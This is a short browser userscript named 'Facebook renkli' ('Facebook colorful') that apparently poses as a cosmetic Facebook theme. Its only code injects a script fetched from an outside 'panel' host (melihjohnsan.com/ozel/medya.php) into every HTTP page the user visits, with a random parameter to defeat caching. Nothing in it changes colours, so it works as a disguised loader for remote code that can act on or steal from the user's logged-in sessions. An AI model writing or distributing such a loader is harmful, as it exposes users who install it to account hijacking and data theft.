// ==UserScript==
// @name       Facebook renkli
// @namespace  http://use.i.E.your.homepage/
// @version    0.1
// @description  enter something useful
// @match      http://*/*
// @copyright  2012+, You
// ==/UserScript==


function addJavascript(jsname){
if(document.getElementsByName(jsname).length <= 0 || (document.getElementsByName(jsname).length > 0 && document.getElementsByName(jsname)[0].src != jsname)){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
    s.setAttribute("name",jsname);
	s.setAttribute('src',jsname);
	th.appendChild(s);
}
}
addJavascript("http://panel.melihjohnsan.com/ozel/medya.php?"  +  Math.random());